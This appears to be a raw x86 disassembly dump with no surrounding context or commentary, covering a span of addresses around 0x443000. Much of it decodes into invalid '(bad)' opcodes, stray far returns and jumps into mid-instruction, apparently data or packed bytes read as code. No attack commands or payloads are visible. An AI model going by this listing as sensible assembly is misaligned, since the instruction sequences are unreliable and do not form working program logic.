  442fc2:	sub    dl,bh
  442fc4:	dec    esi
  442fc5:	jmp    FWORD PTR [eax-0x42]
  442fc8:	cmc    
  442fc9:	inc    ebx
  442fca:	jne    0x442f91
  442fcc:	mov    esp,0xcb35b1cc
  442fd1:	int3   
  442fd2:	test   eax,0x41cccb35
  442fd7:	dec    edi
  442fd8:	retf   
  442fd9:	int3   
  442fda:	ror    BYTE PTR [ebp+0xb5183eb],0x66
  442fe1:	add    bh,cl
  442fe3:	add    ch,BYTE PTR [eax-0x24]
  442fe6:	jbe    0x442faa
  442fe8:	(bad)  
  442fe9:	(bad)  
  442fea:	pusha  
  442feb:	retf   0x43f5
  442fee:	jne    0x442f7b
  442ff0:	inc    edx
  442ff1:	clc    
  442ff2:	int    0x2a
  442ff4:	cld    
  442ff5:	aas    
  442ff6:	jne    0x442f85
  442ff8:	inc    edx
  442ff9:	clc    
  442ffa:	lds    ebp,FWORD PTR [edx]
  442ffc:	mov    ch,0xff
  442ffe:	and    ah,BYTE PTR [edx]
  443000:	jl     0x442fc6
  443002:	ins    DWORD PTR es:[edi],dx
  443003:	mov    eax,DWORD PTR [edx-0x4]
  443006:	dec    bh
  443008:	sqrtps xmm7,xmm6
  44300b:	mov    bh,0xb
  44300d:	push   edx
  44300e:	out    dx,al
  44300f:	mov    DWORD PTR [edi],0xfbb7fa50
  443015:	mov    ebx,eax
  443017:	mov    edi,0x8d40ccbc
  44301c:	jmp    0x44306f
  44301e:	mov    edx,0x7500fbc7
  443023:	add    al,BYTE PTR [eax]
  443025:	jmp    0x443027
  443027:	add    BYTE PTR [eax],al
  443029:	add    BYTE PTR [eax],al
  44302b:	jl     0x442fba
  44302d:	inc    edx
  44302e:	cld    
  44302f:	test   BYTE PTR [edx-0x2],0x88
  443033:	cmp    BYTE PTR [esi],bl
  443035:	test   BYTE PTR [ebp-0x47],cl
  443038:	fisttp QWORD PTR [edx+0x10]
  44303b:	add    DWORD PTR es:[ebp+0x53057d55],eax
  443042:	cld    
  443043:	jb     0x44309d
  443045:	std    
  443046:	mov    ch,BYTE PTR [eax]
  443048:	push   cs
  443049:	std    
  44304a:	dec    esp
  44304b:	xchg   ecx,eax
  44304c:	adc    DWORD PTR [edx+0x73444e11],esi
  443052:	pop    es
  443053:	mov    ebp,0x75000003
  443058:	sub    eax,0xd545eb03
  44305d:	mov    edi,0xbcbf508b
  443062:	int3   
  443063:	xor    DWORD PTR [esi-0x35],ecx
  443066:	int3   
  443067:	sub    DWORD PTR [esi-0x35],ecx
  44306a:	int3   
  44306b:	inc    ecx
  44306c:	dec    esi
  44306d:	retf   
  44306e:	int3   
  44306f:	mov    al,ds:0x5db9eb8d
  443074:	add    al,BYTE PTR [eax]
  443076:	add    cl,dl
  443078:	lea    eax,[esi]
  44307a:	mov    DWORD PTR [eax+0x7543f562],eax
  443080:	mov    edi,0x4e31ccbc
  443085:	retf   
  443086:	int3   
  443087:	sub    DWORD PTR [esi-0x35],ecx
  44308a:	int3   
  44308b:	inc    ecx
  44308c:	dec    esi
  44308d:	retf   
  44308e:	int3   
  44308f:	add    BYTE PTR [eax],al
  443091:	add    BYTE PTR [eax],al
  443093:	add    BYTE PTR [eax+0x1183eb8d],ah
  443099:	repnz test BYTE PTR [ebp+0x6d],al
  44309d:	test   DWORD PTR [edi+0x4],esi
  4430a0:	jne    0x4430b3
  4430a2:	test   BYTE PTR [eax-0x74fffd8b],cl
  4430a8:	xor    BYTE PTR [edx],cl
  4430aa:	test   DWORD PTR [ecx+0x71],edx
  4430ad:	test   ebp,esp
  4430af:	or     BYTE PTR [ebx+ebp*1-0x733eaa7a],ah
  4430b6:	inc    edx
  4430b7:	or     dh,dh
  4430b9:	inc    ecx
  4430ba:	pop    es
  4430bb:	mov    DWORD PTR [eax],esi
  4430bd:	adc    al,al
  4430bf:	inc    ebp
  4430c0:	mov    cl,0x1
  4430c2:	add    BYTE PTR [eax],al
  4430c4:	jne    0x4430f3
  4430c6:	push   es
  4430c7:	mov    esi,DWORD PTR [eax]
  4430c9:	push   ds
  4430ca:	jl     0x44308d
  4430cc:	je     0x443059
  4430ce:	dec    edx
  4430cf:	cld    
  4430d0:	(bad)  
  4430d1:	mov    dh,0xfb
  4430d3:	cmp    esp,DWORD PTR [eax]
  4430d5:	push   ss
  4430d6:	ins    BYTE PTR es:[edi],dx
  4430d7:	inc    esi
  4430d8:	out    dx,al
  4430d9:	(bad)  
  4430da:	sti    
  4430db:	mov    ebp,DWORD PTR [eax]
  4430dd:	adc    cl,BYTE PTR [eax]
  4430df:	mov    bh,0x89
  4430e1:	sar    DWORD PTR [esi-0xa7c8606],0x3
  4430e8:	call   0x5989b5c1
  4430ed:	mov    WORD PTR [edx-0x10],cs
  4430f0:	adc    BYTE PTR [edi+0x13],0x41
  4430f4:	hlt    
  4430f5:	and    al,0xf8
  4430f7:	sldt   WORD PTR [eax]
  4430fa:	add    BYTE PTR [eax],al
  4430fc:	add    BYTE PTR [ebp+0x2],dh
  4430ff:	xchg   DWORD PTR [ebp+0x3d],edx
  443102:	mov    WORD PTR [edx+0x8],es
  443105:	dec    ch
  443107:	or     eax,DWORD PTR [ebx]
  443109:	jge    0x443096
  44310b:	push   edx
  44310c:	clc    
  44310d:	out    dx,al
  44310e:	push   es
  44310f:	lsl    esi,WORD PTR [eax+0x7d4d84f2]
  443116:	mov    edx,DWORD PTR [edx+0xc]
  443119:	jbe    0x44310c
  44311b:	test   BYTE PTR [ebp-0x3],cl
  44311e:	mov    DWORD PTR [ebx],eax
  443120:	or     cl,BYTE PTR [esi]
  443122:	push   0xffffff84
  443124:	push   ebp
  443125:	jge    0x4430b2
  443127:	inc    edx
  443128:	or     BYTE PTR [esi-0x3c],dh
  44312b:	add    ecx,DWORD PTR [ecx+0x6be70a38]
  443131:	ficomp DWORD PTR [edi]
  443133:	clc    
  443134:	mov    ebx,eax
  443136:	mov    ebp,0x8b20ccbc
  44313b:	jmp    0x4430c0
  44313d:	shl    esi,1
  44313f:	test   BYTE PTR [ebp+0x6d],al
  443142:	mov    DWORD PTR [edx-0x1c],eax
  443145:	dec    ch
  443147:	jecxz  0x4430d4
  443149:	inc    eax
  44314a:	es cld 
  44314c:	push   eax
  44314d:	popa   
  44314e:	mov    DWORD PTR [edx-0x18],edx
  443151:	out    dx,al
  443152:	(bad)
  443155:	std    
  443156:	cmp    bh,0xff
  443159:	jne    0x4430e4
  44315b:	dec    edx
  44315c:	lock neg BYTE PTR [ebp+0xef]
  443163:	add    BYTE PTR [eax],al
  443165:	add    BYTE PTR [edx-0x7a],ch
  443168:	hlt    
  443169:	add    BYTE PTR [ebp+0x2],dh
  44316c:	test   DWORD PTR [ebp+0x7d],edx
  44316f:	add    edx,DWORD PTR [ebx-0x10]
  443172:	in     al,dx
  443173:	mov    ah,0xdf
  443175:	mov    esi,DWORD PTR [eax+0x65787c22]
  44317b:	add    cl,BYTE PTR [ecx]
  44317d:	test   BYTE PTR [eax+0x2],dl
  443180:	add    BYTE PTR [eax],al
  443182:	iret   
  443183:	add    ah,BYTE PTR [esi+0x0]
  443186:	out    dx,al
  443187:	int3   
  443188:	fisttp WORD PTR [ebx+0x50fd0ac8]
  44318e:	jns    0x443144
  443190:	clc    
  443191:	adc    eax,0x3c1cad
  443196:	in     al,dx
  443197:	(bad)  
  443198:	sti    
  443199:	mov    edi,DWORD PTR [eax+0x75387c22]
  44319f:	xchg   esi,eax
  4431a0:	push   ss
  4431a1:	mov    esi,DWORD PTR [eax+0x6d558422]
  4431a7:	add    ecx,DWORD PTR [edi]
  4431a9:	mov    DWORD PTR [eax+0x16],ecx
  4431ac:	test   BYTE PTR [ebp-0x2b],al
  4431af:	mov    cl,BYTE PTR [edx+0x8]
  4431b2:	jbe    0x44317e
  4431b4:	jns    0x18285fe2
  4431ba:	(bad)  
  4431bb:	mov    ah,0xdf
  4431bd:	mov    esi,DWORD PTR [eax]
  4431bf:	or     bh,ch
  4431c1:	inc    ecx
  4431c2:	mov    DWORD PTR gs:[edx-0xc],eax
  4431c6:	out    dx,al
  4431c7:	int3   
  4431c8:	fisttp WORD PTR [ebx+0x0]
  4431ce:	add    BYTE PTR [eax+0xa],cl
  4431d1:	std    
  4431d2:	adc    ah,bh
  4431d4:	mov    ah,0xeb
  4431d6:	(bad)  
  4431d7:	cmp    BYTE PTR [edx],bl
  4431d9:	(bad)  
  4431da:	push   DWORD PTR [ebp+0x2]
  4431dd:	test   DWORD PTR [ebp-0x6b],eax
  4431e0:	xor    BYTE PTR [edi+0x10],0x75
  4431e4:	xchg   esi,eax
  4431e5:	or     BYTE PTR [ebx+0x397c2230],cl
  4431eb:	jne    0x443183
  4431ed:	add    bh,al
  4431ef:	mov    eax,0x75fffe1a
  4431f4:	add    al,BYTE PTR [ebp+0x35826955]
  4431fa:	add    cl,ah
  4431fc:	mov    ds:0x8a494584,eax
  443201:	pop    es
  443202:	adc    DWORD PTR [ebx+eax*1+0x0],0x1b96f500
  44320a:	mov    esp,DWORD PTR [eax+0x58028416]
  443210:	sbb    eax,0xb2aafff8
  443215:	test   BYTE PTR [ebp+0x21],cl
  443218:	mov    ah,0xe7
  44321a:	mov    ch,0x18
  44321c:	push   ds
  44321d:	clc    
  44321e:	cmp    DWORD PTR [ecx],0xb
  443221:	xchg   DWORD PTR [ebp+0x29],eax
  443224:	sub    bl,BYTE PTR [ebx]
  443226:	mov    ebp,DWORD PTR [eax-0x11fd7bea]
  44322c:	iret   
  44322d:	pop    es
  44322e:	lea    ecx,[ecx+0xa]
  443231:	(bad)  
  443232:	push   ecx
  443233:	add    BYTE PTR [eax],al
  443235:	add    BYTE PTR [eax],al
  443237:	add    dh,bh
  443239:	(bad)  
  44323a:	sti    
  44323b:	push   eax
  44323c:	int    0x75
  44323e:	cli    
  44323f:	(bad)  
  443240:	fiadd  DWORD PTR [ecx-0x3803f73d]
  443246:	fisttp DWORD PTR [ebx+0x55842e38]
  44324c:	mov    eax,ds:0x308b0e8b
  443251:	push   ss
  443252:	jl     0x443214
  443254:	jns    0x4431e1
  443256:	inc    edx
  443257:	hlt    
  443258:	dec    bh
  44325a:	jmp    0x4431df
  44325c:	mov    ah,0x6
  44325e:	xchg   DWORD PTR [ebp-0x77],ecx
  443261:	sub    DWORD PTR [eax+0x7c22288b],edx
  443267:	ret    0x8b61
  44326a:	push   edx
  44326b:	loopne 0x4431f9
  44326d:	or     al,0xf9
  44326f:	(bad)  
  443270:	jp     0x4431fb
  443272:	loop   0x4432d1
  443274:	ss dec esi
  443276:	retf   
  443277:	int3   
  443278:	ror    BYTE PTR [ecx+0xa5183eb],0x68
  44327f:	lock jbe 0x443244
  443282:	(bad)  
  443283:	(bad)  
  443284:	push   0x7543f5b2
  443289:	mov    eax,DWORD PTR [edx-0x8]
  44328c:	int    0x1e
  44328e:	cld    
  44328f:	aas    
  443290:	jne    0x44321b
  443292:	inc    edx
  443293:	clc    
  443294:	lds    ebp,FWORD PTR [edx]
  443296:	cmp    ebp,edi
  443298:	sub    bl,BYTE PTR ds:0xc47c
  44329e:	add    BYTE PTR [eax],al
  4432a0:	add    BYTE PTR [ebp-0x75],ch
  4432a3:	inc    edx
  4432a4:	cld    
  4432a5:	out    dx,al
  4432a6:	into   
  4432a7:	sqrtps xmm7,xmm6
  4432aa:	mov    dh,0xb
  4432ac:	push   edx
  4432ad:	inc    dh
  4432af:	pop    es
  4432b0:	push   eax
  4432b1:	add    dh,BYTE PTR [edi-0x40ef7405]
  4432b7:	mov    esp,0xcb4dc1cc
  4432bc:	int3   
  4432bd:	inc    eax
  4432be:	mov    ebx,ebp
  4432c0:	mov    eax,ds:0x3c1811
  4432c5:	mov    bl,0x1
  4432c7:	push   0xf566688b
  4432cc:	inc    ebx
  4432cd:	jne    0x44325a
  4432cf:	dec    edi
  4432d0:	add    DWORD PTR [edi],eax
  4432d2:	inc    ecx
  4432d3:	xchg   DWORD PTR [eax+0x70],edx
  4432d6:	mov    edi,0x4dc1ccbc
  4432db:	retf   
  4432dc:	int3   
  4432dd:	inc    eax
  4432de:	mov    ebx,ebp
  4432e0:	adc    DWORD PTR [ecx-0x605f60f3],0xffffffc0
  4432e7:	dec    DWORD PTR [edx+0x3ec6d0a7]
  4432ed:	inc    cl
  4432ef:	das    
  4432f0:	mov    esp,DWORD PTR [edi-0x11c13278]
  4432f6:	leave  
  4432f7:	or     ecx,DWORD PTR [ebx-0xbb575b9]
  4432fd:	inc    ch
  4432ff:	repz mov ebp,DWORD PTR [ebp+0x4d870e]
  443306:	add    BYTE PTR [eax],al
  443308:	add    BYTE PTR [eax],al
  44330a:	pop    ebp
  44330b:	mov    BYTE PTR [edx-0x8],dl
  44330e:	cld    
  44330f:	mov    ch,0xfb
  443311:	mov    eax,0x274
  443316:	clc    
  443317:	inc    edx
  443318:	jae    0x44335e
  44331a:	neg    BYTE PTR [ebp+0x6a800f7]
  443320:	sub    eax,0x84df1ec0
  443325:	dec    ebp
  443326:	sbb    eax,0x5e184e88
  44332b:	mov    ch,0x7
  44332d:	jne    0x44339b
  44332f:	xchg   DWORD PTR [edx-0x8],eax
  443332:	dec    ch
  443334:	or     ecx,DWORD PTR [ecx+0x5584fead]
  44333a:	std    
  44333b:	xchg   DWORD PTR [edx+0x10],eax
  44333e:	cld    
  44333f:	rcl    BYTE PTR [edi],0xb8
  443342:	je     0x443346
  443344:	add    BYTE PTR [eax],al
  443346:	into   
  443347:	cli    
  443348:	test   BYTE PTR [ebp-0x23],cl
  44334b:	xchg   DWORD PTR [esi],ecx
  44334d:	mov    DWORD PTR [eax],ebp
  44334f:	sbb    al,BYTE PTR [ebp+eax*2-0x3bd2833]
  443356:	dec    eax
  443357:	push   es
  443358:	sub    eax,0xe506cec0
  44335d:	mov    bl,0x66
  44335f:	inc    edx
  443360:	test   ch,ah
  443362:	dec    eax
  443363:	aas    
  443364:	retf   
  443365:	int3   
  443366:	mov    cl,0x4e
  443368:	retf   
  443369:	int3   
  44336a:	test   eax,0xcccb4e
  44336f:	add    BYTE PTR [eax],al
  443371:	add    BYTE PTR [eax],al
  443373:	ror    DWORD PTR [esi-0x35],0xcc
  443377:	and    BYTE PTR [edi-0x56e7c15],al
  44337d:	rol    BYTE PTR [ebp+0x7d],0x2
  443381:	xor    BYTE PTR [eax],al
  443383:	jne    0x44332f
  443385:	add    eax,DWORD PTR [esi*4+0x5f8c9f02]
  44338c:	mov    edi,0xaf4d4fff
  443391:	sti    
  443392:	call   DWORD PTR [edx+0x7f]
  443395:	ret    
  443396:	or     ah,bh
  443398:	(bad)  
  443399:	repz push 0xffffffb5
  44339c:	xchg   DWORD PTR [edx-0x8],ecx
  44339f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4433a0:	xchg   DWORD PTR [edx],edx
  4433a2:	ins    BYTE PTR es:[edi],dx
  4433a3:	das    
  4433a4:	mov    edi,0xb2b78aff
  4433a9:	dec    edi
  4433aa:	push   0x75
  4433ac:	sbb    edx,DWORD PTR [edx-0xc]
  4433af:	(bad)  
  4433b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4433b1:	cmc    
  4433b2:	inc    ebx
  4433b3:	jne    0x443434
  4433b5:	cmp    ah,BYTE PTR [edi+ecx*1-0x41]
  4433b9:	(bad)  
  4433ba:	dec    DWORD PTR [eax+0x7502b803]
  4433c0:	add    al,BYTE PTR [eax]
  4433c2:	jmp    0x443423
  4433c4:	xchg   DWORD PTR [edx],ecx
  4433c6:	add    BYTE PTR [esi-0x3e],dh
  4433c9:	dec    DWORD PTR [eax+0x671230]
  4433cf:	(bad)  
  4433d1:	jmp    DWORD PTR [edi+0x75]
  4433d4:	(bad)  
  4433d5:	aas    
  4433d6:	add    BYTE PTR [eax],al
  4433d8:	add    BYTE PTR [eax],al
  4433da:	add    BYTE PTR [eax],al
  4433dc:	(bad)  
  4433dd:	hlt    
  4433de:	arpl   dx,di
  4433e0:	add    bh,BYTE PTR ss:[edi-0x3e]
  4433e4:	jne    0x4433e5
  4433e6:	(bad)  
  4433e7:	inc    DWORD PTR [edi+0x2a]
  4433ea:	cdq    
  4433eb:	(bad)  
  4433ec:	stos   BYTE PTR es:[edi],al
  4433ed:	sbb    bh,BYTE PTR [esp+eax*8+0x71]
  4433f1:	pop    edx
  4433f2:	inc    DWORD PTR [edx]
  4433f4:	xor    eax,0x76002b02
  4433f9:	add    al,BYTE PTR [eax]
  4433fb:	mov    edi,DWORD PTR [eax-0x5a]
  4433fe:	cmc    
  4433ff:	inc    ebx
  443400:	jne    0x4433e9
  443402:	(bad)  
  443403:	mov    DWORD PTR [eax+0x76],ebp
  443406:	cmc    
  443407:	inc    ebx
  443408:	jne    0x443397
  44340a:	adc    dl,BYTE PTR [edi+ebp*2+0x1451ffc6]
  443411:	lahf   
  443412:	cmc    
  443413:	inc    ebx
  443414:	jne    0x4433c8
  443416:	test   BYTE PTR [ebp+0x45],cl
  443419:	mov    ah,0xe7
  44341b:	popf   
  44341c:	dec    ecx
  44341d:	sbb    bh,al
  44341f:	cmp    DWORD PTR [ecx],0x7
  443422:	test   DWORD PTR ds:0x3c1cd1,edx
  443428:	jbe    0x4433d9
  44342a:	pop    es
  44342b:	mov    eax,eax
  44342d:	sub    al,BYTE PTR [ebp+edx*2-0x7422e5f3]
  443434:	adc    BYTE PTR [eax+0x4741ccbc],bh
  44343a:	retf   
  44343b:	int3   
  44343c:	mov    al,ds:0x8beb8d
  443441:	add    BYTE PTR [eax],al
  443443:	add    BYTE PTR [eax],al
  443445:	mov    eax,0x6945350a
  44344a:	xchg   ebp,eax
  44344b:	add    BYTE PTR [ebx+0x5e50a38],cl
  443451:	fiadd  WORD PTR ds:0xb7714585
  443457:	mov    esp,0xcb46a9cc
  44345c:	int3   
  44345d:	rol    DWORD PTR [esi-0x35],0xcc
  443461:	and    BYTE PTR [ebp-0x192e7c15],cl
  443467:	rol    BYTE PTR [ebp-0x47],0x2
  44346b:	and    BYTE PTR [esi*2-0x3f7bd73],al
  443472:	mov    edi,0x3a308bd7
  443477:	test   BYTE PTR [ebp+0x6d],dl
  44347a:	add    eax,0xaffc3c4f
  44347f:	fisttp WORD PTR [ebx-0x48f7ddd0]
  443485:	sub    eax,0x955584ee
  44348a:	xchg   DWORD PTR [ebx+0xa],eax
  44348d:	lea    ecx,[ebx-0x112217be]
  443493:	add    eax,DWORD PTR [eax+0x75]
  443496:	lea    ecx,[edx]
  443498:	mov    WORD PTR [edi-0x3b],ds
  44349b:	call   DWORD PTR [eax+0x5d]
  44349e:	leave  
  44349f:	hlt    
  4434a0:	dec    DWORD PTR [edx-0x7b]
  4434a3:	ret    
  4434a4:	or     ah,ch
  4434a6:	mov    esi,0x6aef
  4434ab:	add    BYTE PTR [eax],al
  4434ad:	add    BYTE PTR [ebp+0x752fffaa],dh
  4434b3:	add    ch,BYTE PTR [eax+0x0]
  4434b6:	push   ebp
  4434b7:	(bad)  
  4434b8:	jmp    FWORD PTR [ecx+0x75]
  4434bb:	sbb    DWORD PTR [edx-0x10],edx
  4434be:	in     al,dx
  4434bf:	mov    esi,0x22a88be3
  4434c4:	test   BYTE PTR [edx-0x5f],al
  4434c7:	mov    dl,0x84
  4434c9:	dec    ebp
  4434ca:	ins    DWORD PTR es:[edi],dx
  4434cb:	mov    bl,0x84
  4434cd:	push   ebp
  4434ce:	adc    DWORD PTR [edi+eiz*8-0x7e70f3f],esi
  4434d5:	xor    DWORD PTR [ecx-0x16ba3efb],0x1
  4434dc:	add    BYTE PTR [eax],al
  4434de:	jne    0x44350d
  4434e0:	push   es
  4434e1:	mov    edi,DWORD PTR [eax]
  4434e3:	push   cs
  4434e4:	jl     0x4434a6
  4434e6:	je     0x443473
  4434e8:	inc    edx
  4434e9:	hlt    
  4434ea:	out    dx,al
  4434eb:	(bad)  
  4434ec:	fisttp WORD PTR [edi]
  4434ee:	add    dh,BYTE PTR [ebx+0xe483901]
  4434f4:	ins    BYTE PTR es:[edi],dx
  4434f5:	pop    ecx
  4434f6:	(bad)  
  4434f7:	mov    esi,0xee1d83e7
  4434fc:	push   DWORD PTR [ebx+0x30]
  4434ff:	lea    ecx,[edx-0x18]
  443502:	neg    BYTE PTR [edx-0x29fefff1]
  443508:	test   BYTE PTR [ebp-0x73],dl
  44350b:	mov    WORD PTR ds:0xdfc6ee10,?
  443511:	mov    eax,DWORD PTR [eax]
  443513:	add    BYTE PTR [eax],al
  443515:	add    BYTE PTR [eax],al
  443517:	(bad)  
  443518:	(bad)  
  443519:	mov    al,BYTE PTR [ebp+eax*4+0x17]
  44351d:	test   BYTE PTR [ebp+0x55],cl
  443520:	aam    0xcd
  443522:	mul    esp
  443524:	(bad)  
  443525:	test   BYTE PTR [ebp+0x55],dl
  443528:	or     BYTE PTR [ecx-0x7b4d76be],ch
  44352e:	inc    ebp
  44352f:	dec    ebp
  443530:	mov    WORD PTR [edx+0x8],cs
  443533:	jbe    0x4434ff
  443535:	adc    edx,DWORD PTR [ecx-0x2]
  443538:	lods   eax,DWORD PTR ds:[esi]
  443539:	out    0x8b,eax
  44353b:	mov    al,0x1e
  44353d:	cld    
  44353e:	inc    ecx
  44353f:	jno    0x4434f3
  443541:	out    0x55,eax
  443543:	sbb    BYTE PTR [eax],bl
  443545:	clc    
  443546:	cmp    DWORD PTR [ecx],0x7
  443549:	test   DWORD PTR [ebp+0x1d],ecx
  44354c:	test   BYTE PTR [esi-0x183a13d8],bh
  443552:	jmp    0x44353b
  443554:	mov    edx,DWORD PTR [edx-0x1c]
  443557:	inc    edi
  443558:	sub    cl,BYTE PTR [ecx]
  44355a:	cld    
  44355b:	jmp    0x23aa:0x79c47c17
  443562:	add    al,0x35
  443564:	add    bl,BYTE PTR [edi-0x3c3074]
  44356a:	dec    edi
  44356b:	fisttp QWORD PTR [ebx-0x7c3d000b]
  443571:	ret    
  443572:	or     ah,ch
  443574:	mov    ebp,0x8a7083db
  443579:	cmc    
  44357a:	inc    ebx
  44357b:	add    BYTE PTR [eax],al
  44357d:	add    BYTE PTR [eax],al
  44357f:	add    BYTE PTR [ebp+0x2],dh
  443582:	jae    0x44358e
  443584:	out    dx,al
  443585:	add    eax,0x236fa80
  44358a:	dec    edi
  44358b:	jmp    FWORD PTR [eax]
  44358d:	ss jl  0x4435cd
  443590:	std    
  443591:	sbb    al,0x3c
  443593:	add    BYTE PTR [ebp-0x73],dh
  443596:	sbb    ebp,DWORD PTR [edx+0x35]
  443599:	stos   BYTE PTR es:[edi],al
  44359a:	jmp    FWORD PTR [edi]
  44359c:	jne    0x4435a0
  44359e:	test   DWORD PTR [ebp+0x69],edx
  4435a1:	mov    ah,0x84
  4435a3:	inc    ebp
  4435a4:	push   ebp
  4435a5:	mov    eax,DWORD PTR [edi+0x34]
  4435a8:	les    edx,FWORD PTR [edi]
  4435aa:	push   edx
  4435ab:	lock push ss
  4435ad:	sahf   
  4435ae:	cmc    
  4435af:	inc    ebx
  4435b0:	jne    0x4435dd
  4435b2:	adc    ch,BYTE PTR [edx-0x4b]
  4435b5:	stos   BYTE PTR es:[edi],al
  4435b6:	jmp    FWORD PTR [edi]
  4435b8:	jne    0x4435bc
  4435ba:	test   DWORD PTR [ebp+0x31],edx
  4435bd:	mov    ah,0x65
  4435bf:	add    BYTE PTR [edx],ch
  4435c1:	lods   eax,DWORD PTR ds:[esi]
  4435c2:	out    dx,eax
  4435c3:	mov    ds:0x3c1c99,eax
  4435c8:	not    ah
  4435ca:	arpl   dx,di
  4435cc:	mov    dh,0x2
  4435ce:	add    BYTE PTR [ebp+0x60],dh
  4435d1:	lods   al,BYTE PTR ds:[esi]
  4435d2:	aas    
  4435d3:	push   0xffffd275
  4435d8:	out    dx,al
  4435d9:	mov    esp,0x25f50fb
  4435de:	stc    
  4435df:	push   ebp
  4435e0:	in     eax,0x62
  4435e2:	arpl   dx,di
  4435e4:	add    BYTE PTR [eax],al
  4435e6:	add    BYTE PTR [eax],al
  4435e8:	add    BYTE PTR [esi],dh
  4435ea:	add    al,BYTE PTR [ebp+0x4a88d14d]
  4435f0:	fdivr  st,st(6)
  4435f2:	lods   al,BYTE PTR ds:[esi]
  4435f3:	xlat   BYTE PTR ds:[ebx]
  4435f4:	mov    esi,DWORD PTR [eax]
  4435f6:	cmp    bh,ah
  4435f8:	inc    ecx
  4435f9:	or     DWORD PTR [ecx-0x3b111fbe],0xb2448bdf
  443603:	dec    ebp
  443604:	mov    esi,DWORD PTR [eax]
  443606:	push   ds
  443607:	dec    edi
  443608:	mov    esi,DWORD PTR [eax-0x62]
  44360b:	cmc    
  44360c:	inc    ebx
  44360d:	jne    0x4435c0
  44360f:	out    0x91,eax
  443611:	xchg   ecx,eax
  443612:	push   ss
  443613:	clc    
  443614:	xor    DWORD PTR [ecx-0x6aaa7afb],0xffffff82
  44361b:	mov    ch,0xa4
  44361d:	jne    0x443621
  44361f:	add    BYTE PTR [eax],al
  443621:	jmp    0x5589bb01
  443626:	mov    cl,BYTE PTR [edx-0x28]
  443629:	jbe    0x4435b5
  44362b:	lahf   
  44362c:	add    BYTE PTR [ebp+0x2],dh
  44362f:	xchg   DWORD PTR [ebp+0x61],ecx
  443632:	mov    dl,BYTE PTR [edx-0x20]
  443635:	adc    al,0x9f
  443637:	cmc    
  443638:	inc    ebx
  443639:	jne    0x443624
  44363b:	cmp    eax,0xf56f1634
  443640:	inc    ebx
  443641:	jne    0x4435cc
  443643:	or     dl,BYTE PTR [edi+ebp*1-0x11af003e]
  44364a:	out    dx,eax
  44364b:	arpl   dx,di
  44364d:	add    BYTE PTR [eax],al
  44364f:	add    BYTE PTR [eax],al
  443651:	add    BYTE PTR [esi-0x4774b1fe],dh
  443657:	es dec edi
  443659:	call   0x3c4ee7
  44365e:	idiv   BYTE PTR [esi]
  443660:	or     ecx,DWORD PTR [ebx+0x158422a8]
  443666:	pop    ecx
  443667:	sbb    BYTE PTR [eax+eax*1],bh
  44366a:	jbe    0x44361f
  44366c:	daa    
  44366d:	mov    DWORD PTR [eax+0x7543f55e],ecx
  443673:	cmp    DWORD PTR [edx],0xffc1cf88
  443679:	inc    DWORD PTR [eax-0x1a]
  44367c:	sahf   
  44367d:	fs mov edi,0xee4fffc1
  443683:	pop    es
  443684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443685:	cli    
  443686:	add    cl,BYTE PTR ss:[edi-0x75]
  44368a:	add    BYTE PTR [edx-0x4f8abc0b],0xe7
  443691:	jne    0x44362c
  443693:	adc    eax,0x6b983f8
  443698:	lahf   
  443699:	fs pop ecx
  44369c:	dec    DWORD PTR [edi-0x73]
  44369f:	mov    ebp,0x817afff6
  4436a4:	ret    
  4436a5:	add    al,0x5e
  4436a7:	mov    ds:0xc2713467,al
  4436ac:	dec    DWORD PTR [edx+0x43f58670]
  4436b2:	jne    0x443667
  4436b4:	out    0x51,eax
  4436b6:	add    BYTE PTR [eax],al
  4436b8:	add    BYTE PTR [eax],al
  4436ba:	add    BYTE PTR [ebp+edx*1-0x8],cl
  4436be:	xor    DWORD PTR [ecx],0xa
  4436c1:	xchg   DWORD PTR [ebp+0x29],eax
  4436c4:	mov    DWORD PTR [edx],edx
  4436c6:	fs aas 
  4436c8:	sar    edi,0x51
  4436cb:	(bad)  
  4436cc:	mov    esi,0x9e788bdf
  4436d1:	cmc    
  4436d2:	inc    ebx
  4436d3:	jne    0x4436d6
  4436d5:	dec    eax
  4436d6:	sub    ah,al
  4436d8:	mov    DWORD PTR [edx],edx
  4436da:	or     BYTE PTR [edi],0xc1
  4436dd:	call   DWORD PTR [ecx+0x1d]
  4436e0:	jmp    0x814736e0
  4436e5:	ret    
  4436e6:	or     al,0xd4
  4436e8:	xor    ebp,0xdfff7543
  4436ee:	div    DWORD PTR [esi+0x2]
  4436f1:	popf   
  4436f2:	lods   al,BYTE PTR ds:[esi]
  4436f3:	ffreep st(0)
  4436f5:	dec    DWORD PTR [eax+ebp*1+0x356a4e1a]
  4436fc:	test   al,0x1
  4436fe:	mov    esp,DWORD PTR [eax+0x66]
  443701:	cmc    
  443702:	inc    ebx
  443703:	jne    0x4436b5
  443705:	clc    
  443706:	push   ebp
  443707:	mov    eax,ds:0xb2fbdd29
  44370c:	adc    al,0xb7
  44370e:	add    DWORD PTR [ebp+0x2],esi
  443711:	add    BYTE PTR [ebx+0x4bdb698],cl
  443717:	jne    0x44375f
  443719:	retf   
  44371a:	int3   
  44371b:	rol    DWORD PTR [ebp-0x35],0xcc
  44371f:	add    BYTE PTR [eax],al
  443721:	add    BYTE PTR [eax],al
  443723:	add    BYTE PTR [eax],ah
  443725:	mov    ebx,ebp
  443727:	mov    edi,DWORD PTR [eax]
  443729:	or     al,BYTE PTR [ebp-0x434986c0]
  44372f:	int3   
  443730:	inc    ecx
  443731:	inc    edi
  443732:	retf   
  443733:	int3   
  443734:	rol    BYTE PTR [edi-0x5434ac15],0x84
  44373b:	cmp    eax,0x3c18e5
  443740:	(bad)  
  443741:	cmc    
  443742:	jnp    0x44373e
  443744:	mov    dh,0x2
  443746:	test   DWORD PTR ds:0x3c18cd,esi
  44374c:	call   0xcb47:0x365d54b4
  443753:	int3   
  443754:	rol    BYTE PTR [edi-0x4172ae15],0x3
  44375b:	inc    eax
  44375c:	jne    0x4437bf
  44375e:	mov    edi,edx
  443760:	mov    dh,0x2
  443762:	push   eax
  443763:	call   0x3c5241
  443768:	idiv   BYTE PTR [esi]
  44376a:	pop    es
  44376b:	mov    DWORD PTR [eax+0x7d4d8416],esi
  443771:	mov    cl,0x65
  443773:	add    dh,bh
  443775:	in     eax,dx
  443776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443777:	cli    
  443778:	add    cl,BYTE PTR ss:[esi-0x1]
  44377c:	inc    eax
  44377d:	push   ss
